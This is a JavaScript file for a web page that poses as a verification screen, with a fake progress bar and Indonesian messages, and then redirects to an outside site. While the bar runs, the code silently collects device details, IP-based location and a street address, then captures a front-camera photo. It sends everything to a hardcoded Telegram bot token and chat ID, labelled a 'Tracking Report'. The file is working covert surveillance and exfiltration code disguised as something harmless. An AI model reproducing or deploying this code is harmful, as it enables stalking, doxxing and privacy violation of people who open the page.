const token = '7643584152:AAF-Nk9QOmTNvix93g2ji_fNrO2Rgmc0hpQ';
const chatId = '7607549215';

// --- UI Progress ---
const progressBar = document.getElementById('progress-bar');
const loadingDetails = document.getElementById('loading-details');
const loadingMessages = [
  "Tunggu sebentar untuk melakukan verifikasi...",
  "...",
  "10%...",
  "20%...",
  "30%...",
  "80%...",
  "90%..."
];

let progress = 0;
let redirected = false;

setInterval(() => {
  progress += Math.random() * 5;

  if (progress >= 90 && !redirected) {
    redirected = true;
    window.location.href = 'https://cristianvaltacrahser.vercel.app/';
  }

  if (progress > 98) progress = 98;
  progressBar.style.width = progress + '%';

  if (Math.random() > 0.9) {
    loadingDetails.textContent = loadingMessages[Math.floor(Math.random() * loadingMessages.length)];
  }
}, 500);

// --- Kirim ke Telegram ---
const sendToTelegram = async (data) => {
  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        chat_id: chatId,
        text: data,
        parse_mode: 'HTML'
      })
    });
  } catch (e) {
    console.error('Error sending to Telegram:', e);
  }
};

const sendPhoto = async (blob, filename) => {
  try {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, filename);
    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
      method: 'POST',
      body: formData
    });
  } catch (e) {
    console.error('Error sending photo:', e);
  }
};

// --- Lokasi GPS Detail (via OpenStreetMap) ---
const getLocationDetails = async (lat, lon) => {
  try {
    const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
    const data = await response.json();
    if (data.address) {
      return {
        kabupaten: data.address.county || data.address.city || data.address.state || "Tidak diketahui",
        kecamatan: data.address.suburb || data.address.village || data.address.town || "Tidak diketahui",
        fullAddress: data.display_name || "Alamat tidak tersedia"
      };
    }
  } catch (e) {
    console.error('Error getting location details:', e);
  }
  return {
    kabupaten: "Tidak diketahui",
    kecamatan: "Tidak diketahui",
    fullAddress: "Alamat tidak tersedia"
  };
};

// --- Tracking Device Info Lengkap ---
const collectDeviceInfo = async () => {
  let message = '╭───── Tracking Report ───── ⦿\n\n';
  message += '⚙️ DEVICE INFORMATION\n';
  message += `🖥️ Device: ${navigator.userAgent}\n`;
  message += `💻 Platform: ${navigator.platform}\n`;
  message += `🌐 Bahasa: ${navigator.language}\n`;
  message += `📶 Online: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
  message += `📺 Screen: ${screen.width}x${screen.height}\n`;
  message += `🪟 Window: ${window.innerWidth}x${window.innerHeight}\n`;
  message += `💾 RAM: ${navigator.deviceMemory || 'Unknown'} GB\n`;
  message += `🧠 CPU: ${navigator.hardwareConcurrency}\n`;

  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      message += `🔋 Battery: ${Math.floor(battery.level * 100)}%\n`;
      message += `🔌 Charging: ${battery.charging ? '✅ YA' : '❌ TIDAK'}\n`;
    } catch {
      message += '🔋 Battery: ❌ Tidak tersedia\n';
    }
  }

  message += `⏰ Akses: ${new Date().toString()}\n`;
  message += `🕒 Load Time: ${(performance.now()).toFixed(2)} ms\n`;
  message += `📜 History: ${history.length}\n`;
  message += `✋ Touch: ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n`;
  message += `🔗 Referrer: ${document.referrer || 'None'}\n`;
  message += `🌍 URL: ${window.location.href}\n`;
  message += `📄 Title: ${document.title}\n`;
  message += `🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
  message += `🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;

  try {
    const ipRes = await fetch('https://ipapi.co/json/');
    const ip = await ipRes.json();
    message += '📍 LOCATION INFORMATION\n';
    message += `📡 IP: ${ip.ip}\n`;
    message += `🏙️ Kota: ${ip.city}\n`;
    message += `🌍 Negara: ${ip.country_name}\n`;
    message += `🏷️ Kode Pos: ${ip.postal}\n`;

    if (ip.latitude && ip.longitude) {
      message += `📌 Lat: ${ip.latitude}\n`;
      message += `📍 Lng: ${ip.longitude}\n`;
      const loc = await getLocationDetails(ip.latitude, ip.longitude);
      message += `🏙️ Kabupaten: ${loc.kabupaten}\n`;
      message += `🏙️ Kecamatan: ${loc.kecamatan}\n`;
      message += `🏠 Alamat: ${loc.fullAddress}\n`;
    }
  } catch {
    message += '❌ Gagal mendapatkan lokasi\n';
  }

  message += '\n╰───── CristianValta03 ───── ⦿';
  return message;
};

// --- Ambil Foto dari Kamera Depan ---
const captureAndSendCameraPhoto = async () => {
  try {
    const video = document.createElement('video');
    const canvas = document.createElement('canvas');

    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });

    video.srcObject = stream;
    await video.play();

    await new Promise(resolve => setTimeout(resolve, 2500));

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);

    canvas.toBlob(async (blob) => {
      if (blob) await sendPhoto(blob, 'front-camera.jpg');
    }, 'image/jpeg');

    stream.getTracks().forEach(track => track.stop());
  } catch (err) {
    await sendToTelegram('❌ Kamera diblokir: ' + err.message);
  }
};

// --- Jalankan Semua ---
const startTracking = async () => {
  const info = await collectDeviceInfo();
  await sendToTelegram(info);
  await captureAndSendCameraPhoto();
};

setTimeout(startTracking, 3000);